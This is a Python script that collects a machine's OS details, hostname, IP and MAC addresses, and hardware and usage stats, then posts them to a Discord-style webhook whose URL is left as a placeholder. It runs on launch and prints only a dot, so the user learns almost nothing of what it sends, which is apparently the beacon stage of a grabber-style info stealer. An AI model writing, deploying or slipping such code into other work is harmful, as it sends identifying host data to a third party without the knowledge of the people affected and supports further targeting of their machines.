import psutil
import platform
import requests
import json

def get_system_info():
    info = {}

    info["platform"] = platform.system()
    info["platform-release"] = platform.release()
    info["platform-version"] = platform.version()
    info["architecture"] = platform.machine()
    info["hostname"] = platform.node()
    
    ip_address = "Not Available"
    mac_address = "Not Available"
    for interface_name, interface_addresses in psutil.net_if_addrs().items():
        for address in interface_addresses:
            if str(address.family) == 'AddressFamily.AF_INET':  # IPv4
                ip_address = address.address
            elif str(address.family) == 'AddressFamily.AF_LINK':  # MAC address
                mac_address = address.address

    info["ip-address"] = ip_address
    info["mac-address"] = mac_address
    info["processor"] = platform.processor()
    info["ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    info["cpu-usage"] = str(psutil.cpu_percent(interval=1)) + "%"
    info["disk-usage"] = str(psutil.disk_usage('/').percent) + "%"

    return info

def send_webhook(url, info):
    embed = {
        "title": "System Information",
        "color": 16711680,  # Red color
        "fields": [
            {"name": "Platform", "value": info["platform"], "inline": True},
            {"name": "Platform Release", "value": info["platform-release"], "inline": True},
            {"name": "Platform Version", "value": info["platform-version"], "inline": True},
            {"name": "Architecture", "value": info["architecture"], "inline": True},
            {"name": "Hostname", "value": info["hostname"], "inline": True},
            {"name": "IP Address", "value": info["ip-address"], "inline": True},
            {"name": "MAC Address", "value": info["mac-address"], "inline": True},
            {"name": "Processor", "value": info["processor"], "inline": True},
            {"name": "RAM", "value": info["ram"], "inline": True},
            {"name": "CPU Usage", "value": info["cpu-usage"], "inline": True},
            {"name": "Disk Usage", "value": info["disk-usage"], "inline": True}
        ]
    }

    data = {
        "content": "Here is the system information:",
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(url, data=json.dumps(data), headers=headers)

    if response.status_code == 204:
        print(".,")
    else:
        print(f".")

if __name__ == "__main__":
    webhook_url = "YOU WEBHOOK URL"
    system_info = get_system_info()
    send_webhook(webhook_url, system_info)
